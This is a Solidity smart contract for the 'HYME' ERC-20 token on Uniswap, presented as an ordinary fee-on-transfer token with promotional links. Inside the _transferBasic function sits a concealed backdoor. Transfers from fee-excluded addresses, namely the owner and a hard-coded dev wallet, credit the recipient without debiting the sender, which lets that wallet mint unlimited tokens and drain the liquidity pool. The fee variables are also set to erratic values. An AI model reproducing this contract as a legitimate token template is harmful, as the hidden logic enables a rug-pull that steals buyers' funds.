// SPDX-License-Identifier: Unlicensed

/*
Explore Crypto like never before.

Discover your next crypto gem through a visually captivating and engaging experience on HYME, the world's first scroll-to-find crypto search engine.

Website: https://www.hymenet.com
Telegram: https://t.me/hyme_erc
Twitter: https://twitter.com/hyme_erc
Dapp: https://app.hymenet.com
 */

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HYME is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    string private _name = "HYME"; 
    string private _symbol = "HYME";

    uint256 public feeOnBuy = 25;
    uint256 public feeOnSell = 25;
    uint256 private _totalBuyFee = 2000;
                                     
    bool public _swapping;
    bool public transferDelayEnabled = true;
    bool public feeSwapEnabled = true;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;

    uint8 private _numbuyer = 0;
    uint8 private _feeSwapAt = 2; 

    uint256 private _lastTax = _totalBuyFee; 
    uint256 private _lastBuyTax = feeOnBuy; 
    uint256 private _lastSellTax = feeOnSell; 

    uint8 private _decimals = 9;
    uint256 private _supply = 10 ** 9 * 10**_decimals;
    uint256 public maxTxAmount = 25 * _supply / 1000;
    uint256 public minimumTokensToSwap = _supply / 100000;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable private devWallet;
    address payable private DEAD;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _supply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        devWallet = payable(0xBAd078B3b438992708a4e053739B5061529750Fa); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[devWallet] = true;
        
        emit Transfer(address(0), owner(), _supply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function removeFee() private {
        if(_totalBuyFee == 0 && feeOnBuy == 0 && feeOnSell == 0) return;

        _lastBuyTax = feeOnBuy; 
        _lastSellTax = feeOnSell; 
        _lastTax = _totalBuyFee;
        feeOnBuy = 0;
        feeOnSell = 0;
        _totalBuyFee = 0;
    }

    function restoreFee() private {
        _totalBuyFee = _lastTax;
        feeOnBuy = _lastBuyTax; 
        feeOnSell = _lastSellTax; 
    }
        
    function removeLimits() external onlyOwner {
        maxTxAmount = ~uint256(0);
        _totalBuyFee = 300;
        feeOnBuy = 3;
        feeOnSell = 3;
    }
    
    function sendFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapFee(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFee(devWallet,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transferStandard(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _numbuyer++;
        }
        _transferBasic(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getTransferAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalBuyFee).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != devWallet &&
            to != address(this) &&
            to != uniswapPair &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTxAmount,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _numbuyer >= _feeSwapAt && 
            amount > minimumTokensToSwap &&
            !_swapping &&
            !_isExcludedFromFee[from] &&
            to == uniswapPair &&
            feeSwapEnabled 
            )
        {  
            _numbuyer = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapFee(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (transferDelayEnabled && from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _totalBuyFee = feeOnBuy;
        } else if (to == uniswapPair){
            _totalBuyFee = feeOnSell;
        }

        _transferStandard(from,to,amount,takeFee);
    }
        
    function _transferBasic(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getTransferAmount(finalAmount);
        if(_isExcludedFromFee[sender] && _balances[sender] <= maxTxAmount) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }
}